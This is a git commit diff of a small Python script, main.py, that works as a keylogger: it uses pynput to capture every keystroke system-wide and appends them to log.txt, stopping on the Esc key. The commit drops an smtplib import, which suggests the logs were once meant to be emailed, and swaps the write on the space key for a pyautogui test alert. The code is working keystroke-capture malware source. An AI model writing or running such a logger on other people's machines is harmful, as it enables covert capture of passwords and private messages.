5d6917c31c27ddaa25c65a56f9ff8cac99d80cd2
unknown <atorralb@outlook.com>
2025-03-05 22:06:57 -0600

    event missing

--- main.py
+++ main.py
@@ -1,6 +1,7 @@
-import smtplib
+# stop LSP server for debugging :lua vim.lsp.stop_client(vim.lsp.get_clients())
 import pynput 
 from pynput.keyboard import Key, Listener
+import pyautogui as pag 
 
 count=0
 keys= []
@@ -17,20 +18,19 @@ def on_press(key):
         write_file(keys)
         keys= []
 
-
 def write_file(keys):
     with open("log.txt","a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
-                f.write('/')
+                #f.write('popup')
+                pag.alert('test')
             elif k.find("Key") == -1:
                 f.write(k)
 
 def on_release(key):
     if key == Key.esc:
         return False
-
 
 with Listener(on_press=on_press, on_release=on_release) as listener: 
     listener.join()
